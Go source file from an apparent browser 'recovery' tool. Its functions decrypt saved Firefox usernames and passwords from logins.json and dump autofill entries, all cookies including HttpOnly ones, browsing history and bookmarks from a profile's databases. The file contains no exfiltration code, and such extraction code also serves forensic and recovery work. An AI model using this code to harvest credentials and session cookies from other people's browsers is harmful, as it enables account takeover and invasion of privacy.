package firefox

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sync"

	"recovery/recovery/chromium"
	"recovery/recovery/db"
	"recovery/recovery/types"
)

type firefoxLoginFile struct {
	Logins []firefoxLogin `json:"logins"`
}

type firefoxLogin struct {
	Hostname          string `json:"hostname"`
	EncryptedUsername  string `json:"encryptedUsername"`
	EncryptedPassword string `json:"encryptedPassword"`
}

var nssmu sync.Mutex

func ExtractPasswords(profile types.ProfileInfo, cfg types.BrowserConfig, pids []uint32) []types.PasswordResult {
	loginsPath := filepath.Join(profile.Path, "logins.json")
	data, err := os.ReadFile(loginsPath)
	if err != nil {
		return nil
	}

	var logins firefoxLoginFile
	if err := json.Unmarshal(data, &logins); err != nil {
		return nil
	}
	if len(logins.Logins) == 0 {
		return nil
	}

	nssmu.Lock()
	defer nssmu.Unlock()

	results := nssDecryptLogins(profile.Path, cfg.Name, logins.Logins)
	var out []types.PasswordResult
	for _, r := range results {
		if r.URL != "" && (r.Username != "" || r.Password != "") {
			r.Browser = cfg.Name
			r.Profile = profile.Name
			out = append(out, r)
		}
	}
	return out
}

func ExtractAutofill(profile types.ProfileInfo, cfg types.BrowserConfig, pids []uint32) []types.AutofillResult {
	dbPath := filepath.Join(profile.Path, "formhistory.sqlite")
	if _, err := os.Stat(dbPath); err != nil {
		return nil
	}

	d, err := db.OpenDatabase(dbPath, pids)
	if err != nil {
		return nil
	}
	defer d.Close()

	rows, err := d.Query("SELECT fieldname, value, timesUsed, firstUsed FROM moz_formhistory")
	if err != nil {
		rows2, err2 := d.Query("SELECT fieldname, value FROM moz_formhistory")
		if err2 != nil {
			return nil
		}
		defer rows2.Close()
		var results []types.AutofillResult
		for rows2.Next() {
			var name, value sql.NullString
			rows2.Scan(&name, &value)
			if name.String != "" {
				results = append(results, types.AutofillResult{
					Name:    name.String,
					Value:   value.String,
					Browser: cfg.Name,
					Profile: profile.Name,
				})
			}
		}
		return results
	}
	defer rows.Close()

	var results []types.AutofillResult
	for rows.Next() {
		var name, value sql.NullString
		var timesUsed, firstUsed sql.NullInt64
		rows.Scan(&name, &value, &timesUsed, &firstUsed)

		var dateCreated int64
		if firstUsed.Int64 > 0 {
			dateCreated = firstUsed.Int64 / 1000000
		}

		if name.String != "" {
			results = append(results, types.AutofillResult{
				Name:        name.String,
				Value:       value.String,
				DateCreated: dateCreated,
				Browser:     cfg.Name,
				Profile:     profile.Name,
			})
		}
	}
	return results
}

func ExtractCookies(profile types.ProfileInfo, cfg types.BrowserConfig) []types.CookieResult {
	dbPath := filepath.Join(profile.Path, "cookies.sqlite")
	if _, err := os.Stat(dbPath); err != nil {
		return nil
	}

	d, err := db.OpenDatabase(dbPath, nil)
	if err != nil {
		return nil
	}
	defer d.Close()

	rows, err := d.Query("SELECT host, name, value, path, isSecure, isHttpOnly, expiry FROM moz_cookies")
	if err != nil {
		return nil
	}
	defer rows.Close()

	var results []types.CookieResult
	for rows.Next() {
		var host, name, value, path sql.NullString
		var secure, httpOnly, expiry sql.NullInt64
		rows.Scan(&host, &name, &value, &path, &secure, &httpOnly, &expiry)
		results = append(results, types.CookieResult{
			Host:       host.String,
			Name:       name.String,
			Value:      value.String,
			Path:       path.String,
			Secure:     secure.Int64 != 0,
			HTTPOnly:   httpOnly.Int64 != 0,
			ExpiresUTC: expiry.Int64,
			Browser:    cfg.Name,
			Profile:    profile.Name,
		})
	}
	return results
}

func ExtractHistory(profile types.ProfileInfo, cfg types.BrowserConfig) []types.HistoryResult {
	dbPath := filepath.Join(profile.Path, "places.sqlite")
	if _, err := os.Stat(dbPath); err != nil {
		return nil
	}
	d, err := db.OpenDatabase(dbPath, nil)
	if err != nil {
		return nil
	}
	defer d.Close()

	q := fmt.Sprintf(
		`SELECT p.url, p.title, h.visit_date FROM moz_historyvisits h
		 JOIN moz_places p ON p.id = h.place_id
		 ORDER BY h.visit_date DESC LIMIT %d`,
		chromium.HistoryLimit,
	)
	rows, err := d.Query(q)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var results []types.HistoryResult
	for rows.Next() {
		var url, title sql.NullString
		var visitDate sql.NullInt64
		rows.Scan(&url, &title, &visitDate)

		var visitTimeUnix int64
		if visitDate.Int64 > 0 {
			visitTimeUnix = visitDate.Int64 / 1000000
		}
		if url.String != "" {
			results = append(results, types.HistoryResult{
				URL:           url.String,
				Title:         title.String,
				VisitTimeUnix: visitTimeUnix,
				Browser:       cfg.Name,
				Profile:       profile.Name,
			})
		}
	}
	return results
}

func ExtractBookmarks(profile types.ProfileInfo, cfg types.BrowserConfig) []types.BookmarkResult {
	dbPath := filepath.Join(profile.Path, "places.sqlite")
	if _, err := os.Stat(dbPath); err != nil {
		return nil
	}
	d, err := db.OpenDatabase(dbPath, nil)
	if err != nil {
		return nil
	}
	defer d.Close()

	rows, err := d.Query(`SELECT b.title, p.url FROM moz_bookmarks b
		JOIN moz_places p ON p.id = b.fk
		WHERE b.type = 1 AND p.url != '' ORDER BY b.dateAdded DESC`)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var results []types.BookmarkResult
	for rows.Next() {
		var title, url sql.NullString
		rows.Scan(&title, &url)
		if url.String != "" {
			results = append(results, types.BookmarkResult{
				Name:    title.String,
				URL:     url.String,
				Type:    "url",
				Browser: cfg.Name,
				Profile: profile.Name,
			})
		}
	}
	return results
}
